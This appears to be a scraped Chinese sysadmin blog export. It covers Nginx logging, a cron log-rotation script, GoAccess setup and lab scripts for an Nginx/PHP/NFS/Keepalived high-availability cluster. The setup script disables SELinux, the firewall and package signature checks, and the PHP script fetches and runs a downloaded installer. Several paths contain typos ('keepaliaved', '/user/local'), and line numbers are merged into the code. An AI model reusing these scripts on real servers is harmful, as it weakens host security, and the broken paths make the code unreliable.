---------------------------&#x7701;&#x7565;--------------------------------------}# ---------------------------&#x7701;&#x7565;-------------------------------------- &#x67E5;&#x770B;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;12345[root@rhel76 ~]&amp; nginx -tnginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful[root@rhel76 ~]&amp; systemctl restart nginx[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log &#x4F7F;&#x7528;curl&#x8BF7;&#x6C42;nginx&#x4FE1;&#x606F;123456789101112[root@ctos74 ~]&amp; curl -I 192.168.73.24HTTP/1.1 200 OKServer: nginx/1.12.2Date: Fri, 03 Jun 2022 11:55:27 GMTContent-Type: text/htmlContent-Length: 612Last-Modified: Thu, 02 Jun 2022 21:48:43 GMTConnection: keep-aliveETag: &quot;6299303b-264&quot;Accept-Ranges: bytes[root@ctos74 ~]&amp; Nginx&#x7684;&#x65E5;&#x5FD7;&#x53D8;&#x5316;&#xFF1A;12[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log 192.168.73.20 - - [03/Jun/2022:19:55:27 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;-&quot; &#x4F7F;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;nginx&#x670D;&#x52A1;&#xFF1A; &#x8FD9;&#x91CC;&#x4EE5;Microsoft Edge&#x4E3A;&#x4F8B;Edge&#x7248;&#x672C; 102.0.1245.30 (&#x6B63;&#x5F0F;&#x7248;&#x672C;) (64 &#x4F4D;) 1234[root@rhel76 ~]&amp; tail -f /usr/local/nginx/logs/host.access.log192.168.73.20 - - [03/Jun/2022:19:55:27 +0800] &quot;HEAD / HTTP/1.1&quot; 200 0 &quot;-&quot; &quot;curl/7.29.0&quot; &quot;-&quot;192.168.73.1 - - [03/Jun/2022:20:02:33 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot; &quot;-&quot;192.168.73.1 - - [03/Jun/2022:20:02:33 +0800] &quot;GET /favicon.ico HTTP/1.1&quot; 404 571 &quot;http://192.168.73.24/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30&quot; &quot;-&quot; Nginx&#x65E5;&#x5FD7;&#x5207;&#x5272;&#x521B;&#x5EFA;nginx&#x65E5;&#x5FD7;&#x6309;&#x6BCF;&#x5206;&#x949F;&#x81EA;&#x52A8;&#x5207;&#x5272;&#x811A;&#x672C;&#x5982;&#x4E0B;&#xFF1A; 1[root@rhel76 ~]&amp; vim /usr/local/nginx/conf/nginx_log.sh 12345678910111213#!/bin/bash# &#x8BBE;&#x7F6E;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x76EE;&#x5F55;LOG_HOME=&quot;/usr/local/nginx/logs/&quot;# &#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x540D;&#x79F0;LOG_PATH_BAK=&quot;$(date -d yesterday +%Y%m%d%H%M)&quot;.nginx666.access.log# &#x91CD;&#x547D;&#x540D;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;mv ${LOG_HOME}/nginx666.access.log ${LOG_HOME}/${LOG_PATH_BAK}# &#x5411;nginx&#x4E3B;&#x673A;&#x8FDB;&#x7A0B;&#x53D1;&#x9001;&#x4FE1;&#x53F7;&#xFF0C;&#x91CD;&#x65B0;&#x6253;&#x5F00;&#x65E5;&#x5FD7;kill -USR1 `cat /usr/local/nginx/logs/nginx.pid` 1[root@rhel76 ~]&amp; chmod +x /usr/local/nginx/conf/nginx_log.sh &#x521B;&#x5EFA;crontab&#x8BBE;&#x7F6E;&#x4F5C;&#x4E1A; 123456[root@rhel76 ~]&amp; crontab -e* * * * * /bin/bash /usr/local/nginx/conf/nginx_log.shcrontab: installing new crontab[root@rhel76 ~]&amp; 1L, 55C written[root@rhel76 ~]&amp; 12345678910111213141516171819202122[root@rhel76 ~]&amp; ls /usr/local/nginx/logs/access.log error.log host.access.log nginx666.access.log nginx.pid[root@rhel76 ~]&amp;[root@rhel76 ~]&amp; ll /usr/local/nginx/logs/total 16-rw-r--r--. 1 root root 0 Jun 3 20:27 202206022028.nginx666.access.log-rw-r--r--. 1 root root 1540 Jun 3 06:33 access.log-rw-r--r--. 1 nobody root 2741 Jun 3 20:02 error.log-rw-r--r--. 1 nobody root 2246 Jun 3 20:24 host.access.log-rw-r--r--. 1 nobody root 0 Jun 3 20:28 nginx666.access.log-rw-r--r--. 1 root root 6 Jun 3 20:27 nginx.pid[root@rhel76 ~]&amp;[root@rhel76 ~]&amp; ll /usr/local/nginx/logs/total 24-rw-r--r--. 1 root root 0 Jun 3 20:27 202206022028.nginx666.access.log-rw-r--r--. 1 nobody root 94 Jun 3 20:28 202206022029.nginx666.access.log-rw-r--r--. 1 root root 1540 Jun 3 06:33 access.log-rw-r--r--. 1 nobody root 2741 Jun 3 20:02 error.log-rw-r--r--. 1 nobody root 2246 Jun 3 20:24 host.access.log-rw-r--r--. 1 nobody root 188 Jun 3 20:29 nginx666.access.log-rw-r--r--. 1 root root 6 Jun 3 20:27 nginx.pid[root@rhel76 ~]&amp; Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;error.log&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x4E3B;&#x8981;&#x8BB0;&#x5F55;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;Nginx&#x51FA;&#x9519;&#x65F6;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x683C;&#x5F0F;&#x4E0D;&#x652F;&#x6301;&#x81EA;&#x5B9A;&#x4E49;&#xFF0C;&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7CFB;&#x7EDF;&#x67D0;&#x4E2A;&#x670D;&#x52A1;&#x6216;server&#x7684;&#x6027;&#x80FD;&#x74F6;&#x9888;&#x7B49;&#x3002; Nginx&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x51E0;&#x4E2A;&#x7B49;&#x7EA7;error_ log &#x6307;&#x4EE4;&#x7684;&#x7B2C;1&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B58;&#x653E;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x8DEF;&#x5F84;&#x3002;&#x7B2C;2&#x4E2A;&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x9519;&#x8BEF;&#x8BB0;&#x5F55;&#x8BE6;&#x7EC6;&#x7A0B;&#x5EA6;&#x7684;&#x7B49;&#x7EA7;,&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;errordebug&#x3001;info&#x3001;notice&#x3001;warn&#x3001;error&#x548C;crit, &#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x8BE6;&#x7EC6;&#x7A0B;&#x5EA6;&#x4F9D;&#x6B21;&#x9012;&#x51CF;,debug&#x8BB0;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#x6700;&#x8BE6;&#x7EC6;,crit&#x8BB0;&#x5F55;&#x7684;&#x5185;&#x5BB9;&#x6700;&#x7B80;&#x6D01;&#x3002; 1[root@rhel76 ~]&amp; cat /usr/local/nginx/logs/error.log 12345678910111213141516171819202022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:01 [emerg] 13522#0: still could not bind()2022/06/03 05:54:09 [notice] 13533#0: signal process started2022/06/03 05:54:09 [error] 13533#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: bind() to 0.0.0.0:80 failed (98: Address already in use)2022/06/03 05:54:17 [emerg] 13549#0: still could not bind()2022/06/03 05:54:37 [notice] 13571#0: signal process started2022/06/03 05:54:37 [error] 13571#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)2022/06/03 05:54:41 [notice] 13575#0: signal process started2022/06/03 05:54:41 [error] 13575#0: open() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)2022/06/03 05:55:01 [alert] 13417#0: unlink() &quot;/usr/local/nginx/logs/nginx.pid&quot; failed (2: No such file or directory)2022/06/03 06:27:17 [error] 13613#0: *4 open() &quot;/usr/local/nginx/html/favicon.ico&quot; failed (2: No such file or directory), client: 192.168.73.1, server: localhost, request: &quot;GET /favicon.ico HTTP/1.1&quot;, host: &quot;192.168.73.24&quot;, referrer: &quot;http://192.168.73.24/&quot; &#x7B2C;&#x4E09;&#x65B9;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#x2014;&#x2014;&#x2014;&#x2014;GoAccessGoAccess &#x662F;&#x4E00;&#x6B3E;&#x5F00;&#x6E90;&#x7684;&#x4E14;&#x5177;&#x6709;&#x4EA4;&#x4E92;&#x89C6;&#x56FE;&#x754C;&#x9762;&#x7684;&#x5B9E;&#x65F6; Web &#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#xFF0C;&#x901A;&#x8FC7;&#x4F60;&#x7684; Web &#x6D4F;&#x89C8;&#x5668;&#x6216;&#x8005; *nix &#x7CFB;&#x7EDF;&#x4E0B;&#x7684;&#x7EC8;&#x7AEF;&#x7A0B;&#x5E8F;(terminal)&#x5373;&#x53EF;&#x8BBF;&#x95EE;&#x3002; &#x80FD;&#x4E3A;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x63D0;&#x4F9B;&#x5FEB;&#x901F;&#x4E14;&#x6709;&#x4EF7;&#x503C;&#x7684; HTTP &#x7EDF;&#x8BA1;&#xFF0C;&#x5E76;&#x4EE5;&#x5728;&#x7EBF;&#x53EF;&#x89C6;&#x5316;&#x670D;&#x52A1;&#x5668;&#x7684;&#x65B9;&#x5F0F;&#x5448;&#x73B0;&#x3002; &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5B98;&#x7F51;&#xFF1A;https://goaccess.io/&#x4E2D;&#x6587;&#x7AD9;&#xFF1A;https://www.goaccess.cc/&#x6700;&#x65B0;&#x7248;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;https://goaccess.io/download&#x5176;&#x5B83;&#x7248;&#x672C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;https://github.com/allinurl/goaccess/tags 1234567891011121314151617181920212223[root@rhel76 Packages]&amp; [root@rhel76 Packages]&amp; wget https://github.com/allinurl/goaccess/archive/refs/tags/v1.2.tar.gz[root@rhel76 Packages]&amp; tar -zxvf v1.2.tar.gz[root@rhel76 Packages]&amp; cd goaccess-1.2[root@rhel76 goaccess-1.2]&amp; [root@rhel76 goaccess-1.2]&amp; yum install -y ncurses-devel geoip-devel libmaxminddb-devel openssl-devel[root@rhel76 goaccess-1.2]&amp; ./configure --enable-utf8 --enable-geoip=mmdb[root@rhel76 goaccess-1.2]&amp; make &amp;&amp; make install[root@rhel76 ~]&amp; goaccessGoAccess - 1.2Usage: goaccess [filename] [ options ... ] [-c][-M][-H][-q][-d][...]The following options can also be supplied to the command:Log &amp; Date Format Options --date-format=&lt;dateformat&gt; - Specify log date format. e.g., %d/%b/%Y --log-format=&lt;logformat&gt; - Specify log format. Inner quotes need to be escaped, or use single quotes. --time-format=&lt;timeformat&gt; - Specify log time format. e.g., %H:%M:%SUser Interface Options---------------------------------&#x7701;&#x7565;---------------------------------------------------- &#x57FA;&#x672C;&#x4F7F;&#x7528;1[root@rhel76 ~]&amp; goaccess -f /usr/local/nginx/logs/access.log --log-format=&quot;%h %^[%d:%t %^] \\&quot;%r\\&quot; %s %b \\&quot;%R\\&quot; \\&quot;%u\\&quot;&quot; --date-format=&quot;%d/%b/%Y&quot; --time-format=%H:%M:%S XUSh7t.png &#x751F;&#x6210;HTML&#x7EDF;&#x8BA1;&#x8868;12[root@rhel76 nginx]$ goaccess -f /usr/local/nginx/logs/access.log --log-format=&quot;%h %^[%d:%t %^] \\&quot;%r\\&quot; %s %b \\&quot;%R\\&quot; \\&quot;%u\\&quot;&quot; --date-format=&quot;%d/%b/%Y&quot; --time-format=%H:%M:%S --hour-spec=min -o /usr/local/nginx/html/nginx-log.html[root@rhel76 nginx]$ XUG0tP.png document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx平滑升级","date":"2022-06-07T04:47:23.000Z","path":"/posts/1db2b3f1/","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Nginx高可用架构配置","date":"2022-06-07T04:47:14.000Z","path":"/posts/d2802762/","text":"9&#x53F0;&#x673A;&#x5668;IP&#x5730;&#x5740;&#x5206;&#x914D;&#xFF08;&#x9759;&#x6001;&#xFF09;&#xFF1A;&#xFF1A;192.168.110.11 &#x2014;-&gt; Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;192.168.110.12 &#x2014;-&gt; Nginx&#x53CD;&#x5411;&#x4EE3;&#x7406;192.168.110.13 &#x2014;-&gt; Nginx Server192.168.110.14 &#x2014;-&gt; Nginx Server192.168.110.15 &#x2014;-&gt; PHP 5.6192.168.110.16 &#x2014;-&gt; PHP 5.6192.168.110.17 &#x2014;-&gt; &#x5B58;&#x50A8;&#x670D;&#x52A1;192.168.110.18 &#x2014;-&gt; MySQL192.168.110.19 &#x2014;-&gt; NMySQL &#x7CFB;&#x7EDF;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x5728;&#x6BCF;&#x53F0;&#x673A;&#x5668;&#x4E0A;&#x5B8C;&#x6210;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x548C;&#x4F18;&#x5316;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#!/bin/bash# CentOS 7 Local YUM and EPEL Repository# local yum and epel repositoryfunction centos7(){mv -f /etc/yum.repos.d/*.repo /tmp/cat &gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF[local-yum]name=Local Base ISO Repositorybaseurl=http://192.168.110.3/iso/centos7enabled=1gpgcheck=0priority=1EOF# local epelcat &gt; /etc/yum.repos.d/epel-local.repo &lt;&lt; EOF[epel-local]name=Extra Packages for CentOS 7baseurl=http://192.168.110.3/epel/7/x86_64failovermethod=priorityenabled=1gpgcheck=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7EOFyum clean all &amp;&amp; yum makecacheyum install -y vim wget}# Red Hat Enterprise Linux 7 Local YUM and EPEL Repositoryfunction rhel7(){mv -f /etc/yum.repos.d/*.repo /tmpcat &gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF[local-yum]name=Local Base ISO Repositorybaseurl=http://192.168.110.3/iso/rhel7enabled=1gpgcheck=0priority=1EOF# local epelcat &gt; /etc/yum.repos.d/epel-local.repo &lt;&lt; EOF[epel-local]name=Extra Packages for Enterprise Linux 7baseurl=http://192.168.110.3/epel/7Server/x86_64enabled=1gpgcheck=0EOFyum clean all &amp;&amp; yum makecacheyum install -y vim wget}# Optimiz Linuxsed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null# Change IP Address name=`ip a | grep ens | tr -d : | awk &apos;{print $2}&apos; | head -1`ip=`ip a | grep &quot;\\&lt;inet\\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`cat &gt; /etc/sysconfig/network-scripts/ifcfg-$name &lt;&lt; EOFTYPE=EthernetBOOTPROTO=staticDEFROUTE=yesPEERDNS=yesPEERROUTES=yesIPV4_FAILURE_FATAL=noNAME=$nameDEVICE=$nameONBOOT=yesIPADDR=$ipNETMASK=255.255.255.0GATEWAY=192.168.110.1DNS1=192.168.110.1EOF# Manual replace ip addressread -p &quot;Change New IP Address: &quot; new_ipsed -i &quot;s/$ip/$new_ip/g&quot; /etc/sysconfig/network-scripts/ifcfg-$namesystemctl restart network# Change hostnamehost_bit=`ip a | grep &quot;\\&lt;inet\\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1 | awk &apos; BEGIN{ FS=&quot;.&quot;} { print $4 }&apos;`hostnamectl set-hostname server$host_bit# Configuration Local Repository#OS=`cat /etc/redhat-release | awk &apos;{ print $1 }&apos;`if [ `cat /etc/redhat-release | awk &apos;{ print $1 }&apos;` == &quot;CentOS&quot; ] then centos7else rhel7fi# shutdowninit 0 &#x914D;&#x7F6E;Nginx Server123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#!/bin/bash# Install compiler requirment envyum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-libs openssl-devel zlib zlib-devel# source build for Nginx cd /usr/local/src/curl -O --progress http://192.168.110.3/src/nginx-1.12.0.tar.gztar -zxf nginx-1.12.0.tar.gzcd nginx-1.12.0/./configure --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcremakemake installln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginxcd /usr/local/nginx/conf/cp nginx.conf nginx.conf.bak# Change Nginx Configcat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt;EOFuser nobody;worker_processes auto;worker_cpu_affinity 0001;worker_rlimit_nofile 50000;error_log /usr/local/nginx/logs/error.log warn;pid /usr/local/nginx/logs/nginx.pid;events { worker_connections 50000; use epoll; multi_accept on;} http { include mime.types; default_type application/octet-stream; log_format main &apos;\\$remote_addr - \\$remote_user [\\$time_local] &quot;\\$request&quot; &apos; &apos;\\$status \\$body_bytes_sent &quot;\\$http_referer&quot; &apos; &apos;&quot;\\$http_user_agent&quot; &quot;\\$http_x_forwarded_for&quot;&apos;; access_log /usr/local/nginx/logs/access.log main; sendfile on; tcp_nopush on; keepalive_timeout 65; gzip on; gzip_min_length 2K; gzip_buffers 4 16k; gzip_comp_level 5; gzip_types text/plain application/x-javascript text/css application/xml; include /usr/local/nginx/conf/user/*.conf;}EOFnginxmkdir -p /usr/local/nginx/conf/usercat &gt; /usr/local/nginx/conf/user/uplooking.conf &lt;&lt;EOFserver { listen 80; server_name www.uplookinglinux.com; charset utf-8; access_log /usr/local/nginx/logs/uplookinglinux.access.log main; location / { root /var/www/web; index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.thml { root /usr/local/nginx/html; }}EOFnginx -s reloadmkdir -p /var/www/webecho &quot;Welcome to Nginx&quot; &gt; /var/www/web/index.htmlchown -Rf nobody:nobody /var/www/webecho -e &quot;* soft nproc 65535\\n* hard nproc 65535\\n* soft nofile 65535\\n* hard nofile 65535&quot; &gt;&gt; /etc/security/limits.conf# &#x6D4B;&#x8BD5;NginxCURL=&apos;/usr/bin/curl&apos;RVMHTTP=&quot;127.0.0.1&quot;CURLARGS=&quot;-s -I&quot;#raw=&quot;$($CURL $CURLARGS $RVMHTTP)&quot;# curl -s -I 127.0.0.1 &gt; /tmp/stat_code$CURL $CURLARGS $RVMHTTP &gt; /tmp/stat_code# &#x83B7;&#x53D6;http&#x72B6;&#x6001;&#x7801;http_code=`/usr/bin/sed -n &apos;1,1p&apos; /tmp/stat_code | /usr/bin/awk &apos;{ print $2 }&apos;`if [[ $http_code -ge 200 &amp;&amp; $http_code -le 299 ]]then echo -e &quot;\\e[1;32mNginx OK\\e[0m&quot;else echo -e &quot;\\e[1;31mServer Error !\\e[0m&quot;finginx -v# &#x6302;&#x8F7D;NFS&#x76EE;&#x5F55;&#x5230;&#x9759;&#x6001;Nginx Server&#x4E0A;yum install -y nfs-utils &amp;&amp; mount -t nfs 192.168.110.17:/webData /var/www/web/echo -e &quot;192.168.110.17:/webData\\t/var/www/web\\tnfs\\tdefaults\\t0 0&quot; &gt;&gt; /etc/fstabmount -aecho &quot;&#x8BF7;&#x9000;&#x51FA;&#x5F53;&#x671F;&#x4F1A;&#x8BDD;&#x5E76;&#x91CD;&#x65B0;&#x767B;&#x5F55;&#xFF01;&quot; &#x914D;&#x7F6E;Nginx&#x4EE3;&#x7406;&#x548C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#!/bin/bash# &#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x73AF;&#x5883;yum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-libs openssl-devel zlib zlib-devel# &#x83B7;&#x53D6;Nginxcd /usr/local/src/curl -O --progress http://192.168.110.3/src/nginx-1.12.0.tar.gztar -zxf nginx-1.12.0.tar.gzcd nginx-1.12.0/# &#x7F16;&#x8BD1;Nginx./configure --with-http_v2_module --with-http_ssl_module --with-http_sub_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcremakemake installln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginxnginxcd /usr/local/nginx/conf/cp nginx.conf nginx.conf.bakmkdir -p /usr/local/nginx/conf/usercat &gt; /usr/local/nginx/conf/nginx.conf &lt;&lt; EOFuser nobody;worker_processes auto;worker_cpu_affinity 0001;worker_rlimit_nofile 50000;error_log /usr/local/nginx/logs/error.log warn;pid /usr/local/nginx/logs/nginx.pid;events { worker_connections 50000; use epoll; multi_accept on;}http { include mime.types; default_type application/octet-stream; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log /usr/local/nginx/logs/access.log main; sendfile on; tcp_nopush on; keepalive_timeout 65; gzip on; gzip_min_length 2K; gzip_buffers 4 16k; gzip_comp_level 5; gzip_types text/plain application/x-javascript text/css application/xml; upstream webServer { server 192.168.110.13:80 weight=1 max_fails=3 fail_timeout=10s; server 192.168.110.14:80 weight=1 max_fails=3 fail_timeout=10s; } include /user/local/nginx/conf/user/*.conf;}EOFcat &gt; /usr/local/nginx/conf/user/proxy.conf &lt;&lt; EOFserver { listen 80; server_name www.uplookinglinux.com; charset utf-8; access_log /usr/local/nginx/logs/proxy.access.log main; location / { root /var/www/web; index index.html index.htm; #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668; proxy_pass http://webServer; #&#x4F20;&#x9012;&#x5BA2;&#x6237;&#x7684;ip&#x4FE1;&#x606F;&#x7ED9;&#x8FD9;&#x53F0;&#x670D;&#x52A1;&#x5668; &#x5728;&#x540E;&#x53F0;&#x670D;&#x52A1;&#x901A;&#x8FC7;&#x53C2;&#x6570;$http_x_real_ip&#x53D6;&#x5F97;&#x8BE5;&#x4F20;&#x9012;&#x7684;IP&#x4FE1;&#x606F; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_redirect off; proxy_connect_timeout 30; proxy_send_timeout 15; proxy_read_timeout 15; }}EOFnginx -s reload &#x914D;&#x7F6E;&#x5B58;&#x50A8;&#x670D;&#x52A1;1234567891011121314151617181920212223242526272829# &#x5B89;&#x88C5;RAID&#x7BA1;&#x7406;&#x5DE5;&#x5177;yum install -y mdadm# &#x521B;&#x5EFA;RAID10mdadm -Cv /dev/md10 -a yes -l 10 -n 4 /dev/sd[b-e]mdadm -Q /dev/md10mdadm -q /dev/md10# &#x5236;&#x4F5C;LVM&#x5206;&#x533A;pvcreate /dev/md10vgcreate webData /dev/md10lvcreate -n lv_web -L 20G webDatamkfs.xfs /dev/webData/lv_web# &#x6302;&#x8F7D;&#x78C1;&#x76D8;mkdir /webDataecho -e &quot;/dev/webData/lv_web\\t/webData\\t xfs\\tdefaults\\t0 0&quot; &gt;&gt; /etc/fstabmount -a# &#x914D;&#x7F6E;NFS Serveryum install -y rpcbind nfs-utilssystemctl start rpcbind &amp;&gt; /dev/nullsystemctl enable rpcbind &amp;&gt; /dev/nullsystemctl status rpcbindecho -e &quot;/webData *(rw,sync,all_squash,anonuid=99,anongid=99)&quot; &gt; /etc/exportssystemctl start nfssystemctl status nfs &#x914D;&#x7F6E;PHP FastCGI1234567891011121314#!/bin/bash# filename : php-config.sh# &#x914D;&#x7F6E;PHPcd /usr/local/src/curl -O --progress http://192.168.110.3/src/php5.6_auto_install.tar.gztar zxf php5.6_auto_install.tar.gzcd php5.6/chmod a+x install.sh. ./install.sh# &#x521B;&#x5EFA;&#x7AD9;&#x70B9;&#x76EE;&#x5F55;mkdir -p /var/www/webecho -e &quot;&lt;?php\\n\\tphpinfo();\\n?&gt;&quot; &gt; /var/www/web/index.php &#x5728;Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x914D;&#x7F6E;FastCGI1234567891011121314151617181920212223242526272829303132#!/bin/bash# filename : ngxin-fastcgi.shcat &gt;&gt; /usr/local/nginx/conf/nginx.conf &lt;&lt;EOFupstream phpServer { # &#x6307;&#x5B9A;&#x8D1F;&#x8F7D;&#x7B97;&#x6CD5;&#xFF1A;&#x7279;&#x5B9A;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x7531;&#x56FA;&#x5B9A;&#x7684;&#x670D;&#x52A1;&#x5668;&#x670D;&#x52A1;&#xFF0C;&#x89E3;&#x51B3;session&#x5171;&#x4EAB;&#x95EE;&#x9898; ip_hash; server 192.168.110.15:9000 max_fails=3 fail_timeout=10s; server 192.168.110.16:9000 max_fails=3 fail_timeout=10s;}EOFcat &gt;&gt; /usr/local/nginx/conf/user/proxy.conf &lt;&lt; EOFfastcgi_connect_timeout 30;fastcgi_send_timeout 30;fastcgi_read_timeout 30;fastcgi_buffer_size 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;location ~ \\.(php|php5)$ { root /var/www/web; #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230;phpServer&#x96C6;&#x7FA4; fastcgi_pass phpServer; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params;}EOFnginx -tnginx -s reload Nginx&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x9AD8;&#x53EF;&#x7528;&#x2014;&#x2014;Keepalived123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/bin/bashecho -e &quot;192.168.110.11\\tserver11\\n192.168.110.12\\tserver12&quot; &gt;&gt; /etc/hosts# &#x5B89;&#x88C5;Keepalivedyum install -y keepalivedmv -f /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.confbackcat &gt; /etc/keepaliaved/keepalived.conf &lt;&lt; EOF! Configuration File for keepalived global_defs { notification_email { fnaichu@qq.com } notification_email_from keepalvied@proxy-1 smtp_server 127.0.0.1 smtp_connect_timeout 30 router_id proxy-1 vrrp_mcast_group4 224.4.4.4} vrrp_script chk_proxy { script &quot;/etc/keepalived/proxy_check.sh&quot; interval 2 weight -2} vrrp_instance VI_1 { state BACKUP nopreempt virtual_router_id 11 priority 100 advert_int 1 interface ens33 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 192.168.110.10/24 dev ens33 label ens33:1 } track_script { chk_proxy } smtp_alert}EOF# &#x4EE3;&#x7406;&#x68C0;&#x6D4B;&#x811A;&#x672C;cat &gt; /etc/keepaliaved/proxy_check.sh &lt;&lt; EOF#!/bin/bashnetstat -nlpt | grep -w &quot;80&quot; &amp;&gt;&gt; /dev/nullif [ $? -ne 0 ]then systemctl stop keepalivedfiexit 